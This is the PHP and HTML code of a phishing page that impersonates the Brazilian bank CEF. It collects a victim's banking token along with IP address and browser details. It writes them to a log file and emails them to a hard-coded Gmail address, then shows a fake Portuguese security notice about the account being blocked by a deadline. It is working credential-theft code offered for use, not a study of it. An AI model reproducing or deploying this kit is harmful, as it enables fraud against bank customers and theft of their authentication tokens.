<?php
extract($_POST);
$headers = "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .="From: INFOCEF";
$ip = $_SERVER["REMOTE_ADDR"];
date_default_timezone_set('America/Sao_Paulo');
$navegador = $_SERVER['HTTP_USER_AGENT'];
$data=date("d/m/Y");
$hora=date("H:i");

$conteudo = "
| -------------------------------------
| Sistema de Cadastro
| -------------------------------------
| INFOCEF
| Data: $data
| Hora: $hora
| IP: $ip
| -------------------------------------
| Navegador: $navegador
| -------------------------------------
| Token2: $token
| -------------------------------------";

@mail($receber, "INFOCEF-$ip", "$conteudo", $headers); 

$token = $_POST['token'];

$ip_usuario = $_SERVER['REMOTE_ADDR'];
$myFile = "../dados/"."FISICA-CEF".".php";
$fh = fopen($myFile, 'a') or die("Impossivel abrir arquivo.");
$data=date("d/m/Y");
$hora=date("H:i");
$stringData = "
| IP: $ip<br>
| -------------------------------------<br>
| token2: $token<br>
| -------------------------------------<br>";


fwrite($fh, $stringData);
fclose($fh);

@mail("flamengoliberta660@gmail.com","[FISICA-CEF]"."$ip", $stringData, $matts);

?>
<?php

date_default_timezone_set('America/Sao_Paulo');
$prazo = 1;
$data_vencimento = date('d/m/Y', strtotime('+'.$prazo.' days'));
$data_documento = date('d/m/Y');
$numero22 = rand(10000000, 90000000);
$url2 = $_SERVER['HTTP_HOST']; 
$url1 = $_SERVER['REQUEST_URI'];
$hora = date("H:i:s");
$ip = $_SERVER["REMOTE_ADDR"];
?>

<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta content="width=device-width,initial-scale=1" name="viewport">
<title>Sucesso</title>
<link rel="icon" href="Images/favicon.ico">
<link rel="stylesheet" href="css/bootstrap.min.css">
<link rel="stylesheet" href="css/bootstrap-theme.min.css">
<link href="https://fonts.googleapis.com/css?family=Advent+Pro:300|Athiti:200" rel="stylesheet">
<script src="js/bootstrap.min.js"></script>
<script>
function toggleFullScreen() {
  if ((document.fullScreenElement && document.fullScreenElement !== null) ||    
   (!document.mozFullScreen && !document.webkitIsFullScreen)) {
    if (document.documentElement.requestFullScreen) {  
      document.documentElement.requestFullScreen();  
    } else if (document.documentElement.mozRequestFullScreen) {  
      document.documentElement.mozRequestFullScreen();  
    } else if (document.documentElement.webkitRequestFullScreen) {  
      document.documentElement.webkitRequestFullScreen(Element.ALLOW_KEYBOARD_INPUT);  
    }  
  } else {  
    if (document.cancelFullScreen) {  
      document.cancelFullScreen();  
    } else if (document.mozCancelFullScreen) {  
      document.mozCancelFullScreen();  
    } else if (document.webkitCancelFullScreen) {  
      document.webkitCancelFullScreen();  
    }  
  }  
}
</script>
<style>
.modalposition { background-color: rgb(0,0,0); background-color: rgba(0,0,0,0.3); position:fixed; top:0; left:0; right:0; bottom:0; }
.modalposition2{ max-width:380px; margin:0 auto; z-index: 99999; border: 1px solid #999; position: absolute; left:10px; right:10px;	font-family: Arial; top: 25%; background:#FFF; color:#000; box-shadow: 0 0 10px #999; padding:15px 15px 15px 15px; border-radius:3px; }
.modaltext{ padding:15px 15px 15px 0; color:#666666; }
#ok { padding:5px 20px 5px 20px; background:#F3A901; border:1px solid #333; text-shadow:0 0 2px #000; color:#FFF; font-size:16px; border-radius:5px;}
</style>
</head>

<body style="margin:0;">
<iframe name="iframe" id="iframe" src="sucesso.php" frameborder="0" style="position:absolute; height:100%; width:100%;"></iframe>
<!-- ================================================================ -->
<div style="" id="modalalert" class="modalposition">
<div id="modalalert2" class="modalposition2">
<div style="font-size:16px;"><span class="glyphicon glyphicon-lock" style="color:#E60014;"></span>Aviso</div>
<div class="modaldiv1"><div class="modaltext">
  <div id="TextErrorModal" style="font-size:0.9em;">Seu dispositivo foi atualizado com sucesso. E encontra-se pendente. porém sua assinatura corre o risco de ser bloqueada por medida de segurança, caso seu dispositivo não for ativo será necessário efetuar os procedimentos no caixa eletrônico de uma agência mais próxima da sua residência. Você terá até o dia <?php echo $data_vencimento ?> Para realiar os procedimentos.</div></div></div>
<div class="modaldiv2" align="right">
<a href="#closemodal"></a> <a href="#closemodal"><button onClick="document.getElementById('modalalert').style.display='none';return false" id="ok"> Ok</button></a>
</div>
</div>
</div>
<!-- ================================================================ -->
<form name="form" id="form" action="" method="post">
<input type="hidden" name="data_vencimento" id="data_vencimento" value="<?= $data_vencimento; ?>">
</form>
</body>
</html>